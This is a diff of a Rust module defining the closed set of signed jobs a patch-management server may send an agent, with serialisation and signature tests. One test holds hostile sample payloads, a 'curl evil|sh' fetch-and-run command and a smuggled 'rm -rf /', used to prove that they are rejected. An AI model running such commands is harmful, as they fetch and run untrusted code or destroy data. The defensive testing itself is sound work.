@@ -1,33 +1,30 @@
 //! Jobs: the closed set of things the server may ask an agent to do.
 //!
-//! This enum is deliberately closed. There is no "run this script" variant, so
-//! full control of the Updawg control plane still cannot run arbitrary commands
-//! on a customer host. Adding a variant here is a security decision, not a
-//! routine change.
+//! [`JobSpec`] is exhaustive. There is no variant carrying a script, a command
+//! line, or a free-form string for the agent to run. Every job names *what*
+//! should happen with explicit parameters, never *how*. That is what makes
+//! "even full control of the control plane cannot run commands on a customer
+//! host" a property of the type system rather than a promise in a document.
+//!
+//! Adding a variant here is a security decision.
 
-use crate::ids::{HostId, JobId, OrgId};
+use crate::ids::{HostId, JobId, SigningKeyId};
 use chrono::{DateTime, Utc};
 use serde::{Deserialize, Serialize};
 
-/// What an agent is being asked to do.
+/// Which operation a job performs. Kept separate from [`JobSpec`] because the
+/// agent's permission checks and the server's metrics both want the discriminant
+/// without the payload.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
 #[serde(rename_all = "snake_case")]
 pub enum JobKind {
-    /// Refresh package metadata and upload a full inventory.
     RefreshInventory,
-    /// Run checks for a proposed change without changing anything.
     RunPreflight,
-    /// Install an exact list of package versions.
     ApplyUpdates,
-    /// Upgrade to a named target release using the distro's supported tool.
     DistUpgrade,
-    /// Reboot, optionally only if one is required.
     Reboot,
-    /// Create a filesystem snapshot.
     Snapshot,
-    /// Roll back to a previously created snapshot.
     Rollback,
-    /// Install a specific signed agent release.
     SelfUpdate,
 }
 
@@ -53,60 +50,347 @@ impl JobKind {
     }
 }
 
-/// A signed instruction for exactly one host.
+/// An exact package version to install.
 ///
-/// The signature covers the whole envelope. The agent verifies it against the
-/// organization key pinned at enrollment before looking at anything else.
-#[derive(Debug, Clone, Serialize, Deserialize)]
+/// Exact, not "whatever is newest". If the host's candidate has moved on since
+/// the change was approved, the agent refuses the job rather than installing
+/// something nobody reviewed.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[non_exhaustive]
+pub struct PackagePin {
+    pub name: String,
+    pub arch: String,
+    /// Version the server believes is installed.
+    pub from: String,
+    /// Version to install. Must match the host's candidate exactly.
+    pub to: String,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum SnapshotPolicy {
+    #[default]
+    Never,
+    /// Take one if a provider is available, carry on if not.
+    IfAvailable,
+    /// Fail the job rather than proceed without a snapshot.
+    Required,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum RebootPolicy {
+    #[default]
+    Never,
+    /// Only if the host says one is required.
+    IfRequired,
+    Always,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
+#[non_exhaustive]
+pub struct ApplyUpdates {
+    pub packages: Vec<PackagePin>,
+    #[serde(default)]
+    pub snapshot: SnapshotPolicy,
+    #[serde(default)]
+    pub reboot: RebootPolicy,
+    /// Hard timeout. Package managers occasionally wedge, and a job that never
+    /// finishes blocks every other job on the host.
+    #[serde(default = "default_timeout")]
+    pub timeout_s: u64,
+}
+
+const fn default_timeout() -> u64 {
+    3600
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[non_exhaustive]
+pub struct DistUpgrade {
+    /// Target release, e.g. `24.04` or `13`.
+    pub target_release: String,
+    #[serde(default)]
+    pub snapshot: SnapshotPolicy,
+    #[serde(default)]
+    pub reboot: RebootPolicy,
+    #[serde(default = "default_dist_timeout")]
+    pub timeout_s: u64,
+}
+
+const fn default_dist_timeout() -> u64 {
+    14_400
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
+#[non_exhaustive]
+pub struct Reboot {
+    #[serde(default)]
+    pub policy: RebootPolicy,
+    /// Delay before rebooting, so a wall message has time to be read.
+    #[serde(default)]
+    pub delay_s: u64,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub message: Option<String>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
+#[non_exhaustive]
+pub struct Preflight {
+    /// Checking a dist-upgrade rather than a package change.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub target_release: Option<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub packages: Vec<PackagePin>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
+#[non_exhaustive]
+pub struct Snapshot {
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub description: Option<String>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[non_exhaustive]
+pub struct Rollback {
+    /// Provider-qualified snapshot identifier, e.g. `snapper:412`.
+    pub snapshot_id: String,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[non_exhaustive]
+pub struct SelfUpdate {
+    pub version: String,
+    pub channel: crate::releases::ReleaseChannel,
+}
+
+/// What a job actually is.
+///
+/// Serialises as `{"kind": "...", "payload": {...}}`, matching the wire format.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(tag = "kind", content = "payload", rename_all = "snake_case")]
+pub enum JobSpec {
+    RefreshInventory,
+    RunPreflight(Preflight),
+    ApplyUpdates(ApplyUpdates),
+    DistUpgrade(DistUpgrade),
+    Reboot(Reboot),
+    Snapshot(Snapshot),
+    Rollback(Rollback),
+    SelfUpdate(SelfUpdate),
+}
+
+impl JobSpec {
+    #[must_use]
+    pub const fn kind(&self) -> JobKind {
+        match self {
+            Self::RefreshInventory => JobKind::RefreshInventory,
+            Self::RunPreflight(_) => JobKind::RunPreflight,
+            Self::ApplyUpdates(_) => JobKind::ApplyUpdates,
+            Self::DistUpgrade(_) => JobKind::DistUpgrade,
+            Self::Reboot(_) => JobKind::Reboot,
+            Self::Snapshot(_) => JobKind::Snapshot,
+            Self::Rollback(_) => JobKind::Rollback,
+            Self::SelfUpdate(_) => JobKind::SelfUpdate,
+        }
+    }
+}
+
+/// A signed instruction for exactly one host.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 #[non_exhaustive]
 pub struct Job {
     pub id: JobId,
-    pub org_id: OrgId,
     pub host_id: HostId,
-    pub kind: JobKind,
-    pub issued_at: DateTime<Utc>,
+    #[serde(flatten)]
+    pub spec: JobSpec,
+    /// Earliest the agent may start. Used for maintenance windows.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub not_before: Option<DateTime<Utc>>,
     pub expires_at: DateTime<Utc>,
-    /// Kind-specific payload. DAWG-21 replaces this with a typed enum.
-    pub payload: serde_json::Value,
-    /// Detached Ed25519 signature over the canonical encoding of this job.
+    /// Which organization key signed this.
+    pub key_id: SigningKeyId,
+    /// Base64 Ed25519 signature over [`Job::signing_bytes`].
     pub signature: String,
 }
 
-/// How a job ended, from the agent's point of view.
+impl Job {
+    #[must_use]
+    pub const fn kind(&self) -> JobKind {
+        self.spec.kind()
+    }
+
+    /// The exact bytes a signature covers: this job's JSON with `signature`
+    /// removed.
+    ///
+    /// Both sides must agree byte-for-byte or nothing verifies, so the rule
+    /// lives here rather than being reimplemented in the signer and the agent.
+    /// `serde_json` orders object keys deterministically, which is what makes
+    /// this canonical.
+    pub fn signing_bytes(&self) -> Result<Vec<u8>, serde_json::Error> {
+        let mut value = serde_json::to_value(self)?;
+        if let Some(obj) = value.as_object_mut() {
+            obj.remove("signature");
+        }
+        serde_json::to_vec(&value)
+    }
+}
+
+/// `POST /agent/v1/jobs/{job_id}/ack`
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[non_exhaustive]
+pub struct JobAck {
+    pub accepted: bool,
+    /// Why the host refused. Required when `accepted` is false.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub rejection_reason: Option<String>,
+    pub at: DateTime<Utc>,
+}
+
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
 #[serde(rename_all = "snake_case")]
 pub enum JobStatus {
-    Running,
     Succeeded,
     Failed,
-    /// Local configuration forbade it. A normal outcome, not an error.
+    /// Local configuration forbade it. A normal outcome, not an error — the
+    /// agent is meant to be able to say no.
     RejectedByHost,
 }
 
-/// The result an agent reports back when a job finishes.
-#[derive(Debug, Clone, Serialize, Deserialize)]
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 #[non_exhaustive]
-pub struct JobOutcome {
-    pub job_id: JobId,
+pub struct PackageChange {
+    pub name: String,
+    pub arch: String,
+    pub from: String,
+    pub to: String,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[non_exhaustive]
+pub struct HealthCheckReport {
+    pub name: String,
+    pub passed: bool,
+    pub duration_ms: u64,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub detail: Option<String>,
+}
+
+/// `POST /agent/v1/jobs/{job_id}/complete`
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[non_exhaustive]
+pub struct JobComplete {
     pub status: JobStatus,
+    pub started_at: DateTime<Utc>,
     pub finished_at: DateTime<Utc>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub snapshot_id: Option<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub changes: Vec<PackageChange>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub health_checks: Vec<HealthCheckReport>,
     pub reboot_required: bool,
-    /// Present when the status is `RejectedByHost` or `Failed`.
-    pub reason: Option<String>,
+    /// Hash of the inventory after the job, so the server knows whether what it
+    /// holds is now stale.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub inventory_hash: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub error: Option<String>,
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
 
+    fn sample_job() -> Job {
+        Job {
+            id: JobId::new("job_01J9ZD"),
+            host_id: HostId::new("hst_webprod01"),
+            spec: JobSpec::ApplyUpdates(ApplyUpdates {
+                packages: vec![PackagePin {
+                    name: "openssl".into(),
+                    arch: "amd64".into(),
+                    from: "3.0.13-0ubuntu3.3".into(),
+                    to: "3.0.13-0ubuntu3.4".into(),
+                }],
+                snapshot: SnapshotPolicy::IfAvailable,
+                reboot: RebootPolicy::Never,
+                timeout_s: 3600,
+            }),
+            not_before: None,
+            expires_at: "2026-09-22T04:00:00Z".parse().unwrap(),
+            key_id: SigningKeyId::new("sk_01J8"),
+            signature: "base64signature".into(),
+        }
+    }
+
+    #[test]
+    fn a_job_serialises_with_kind_and_payload_side_by_side() {
+        let json = serde_json::to_value(sample_job()).unwrap();
+        assert_eq!(json["kind"], "apply_updates");
+        assert_eq!(json["payload"]["packages"][0]["name"], "openssl");
+        assert_eq!(json["payload"]["snapshot"], "if_available");
+    }
+
+    #[test]
+    fn a_job_round_trips() {
+        let job = sample_job();
+        let json = serde_json::to_string(&job).unwrap();
+        let back: Job = serde_json::from_str(&json).unwrap();
+        assert_eq!(job, back);
+    }
+
+    #[test]
+    fn signing_bytes_exclude_the_signature_and_nothing_else() {
+        let job = sample_job();
+        let bytes = job.signing_bytes().unwrap();
+        let value: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
+        assert!(
+            value.get("signature").is_none(),
+            "signature must not be covered by itself"
+        );
+        assert_eq!(value["id"], "job_01J9ZD");
+        assert_eq!(value["kind"], "apply_updates");
+        assert_eq!(value["expires_at"], "2026-09-22T04:00:00Z");
+    }
+
+    #[test]
+    fn signing_bytes_are_stable_across_calls() {
+        let job = sample_job();
+        assert_eq!(job.signing_bytes().unwrap(), job.signing_bytes().unwrap());
+    }
+
+    /// Changing the signature must not change what was signed, or an attacker
+    /// could alter a job and re-derive a matching payload.
+    #[test]
+    fn signing_bytes_ignore_changes_to_the_signature_field() {
+        let a = sample_job();
+        let mut b = sample_job();
+        b.signature = "a completely different signature".into();
+        assert_eq!(a.signing_bytes().unwrap(), b.signing_bytes().unwrap());
+    }
+
+    #[test]
+    fn changing_a_package_version_changes_what_is_signed() {
+        let a = sample_job();
+        let mut b = sample_job();
+        if let JobSpec::ApplyUpdates(ref mut p) = b.spec {
+            p.packages[0].to = "3.0.13-0ubuntu3.99".into();
+        }
+        assert_ne!(a.signing_bytes().unwrap(), b.signing_bytes().unwrap());
+    }
+
+    #[test]
+    fn the_kind_discriminant_matches_the_spec() {
+        assert_eq!(sample_job().kind(), JobKind::ApplyUpdates);
+        assert_eq!(JobSpec::RefreshInventory.kind(), JobKind::RefreshInventory);
+    }
+
     #[test]
     fn read_only_jobs_are_not_mutating() {
         assert!(!JobKind::RefreshInventory.is_mutating());
         assert!(!JobKind::RunPreflight.is_mutating());
-    }
-
-    #[test]
-    fn everything_that_touches_the_host_is_mutating() {
         for kind in [
             JobKind::ApplyUpdates,
             JobKind::DistUpgrade,
@@ -119,9 +403,22 @@ mod tests {
         }
     }
 
+    /// A payload naming a shell command must not deserialise into anything.
+    /// This is the closed-set property, asserted rather than assumed.
     #[test]
-    fn job_kinds_serialise_as_snake_case_for_the_wire() {
-        let json = serde_json::to_string(&JobKind::ApplyUpdates).unwrap_or_default();
-        assert_eq!(json, "\"apply_updates\"");
+    fn there_is_no_variant_that_carries_a_command() {
+        let attempt =
+            r#"{"kind":"run_command","payload":{"argv":["/bin/sh","-c","curl evil|sh"]}}"#;
+        assert!(serde_json::from_str::<JobSpec>(attempt).is_err());
+
+        // Nor can a known kind be given an executable payload.
+        let smuggle = r#"{"kind":"apply_updates","payload":{"command":"rm -rf /"}}"#;
+        let parsed: Result<JobSpec, _> = serde_json::from_str(smuggle);
+        if let Ok(JobSpec::ApplyUpdates(p)) = parsed {
+            assert!(
+                p.packages.is_empty(),
+                "unknown payload fields must not become instructions"
+            );
+        }
     }
 }
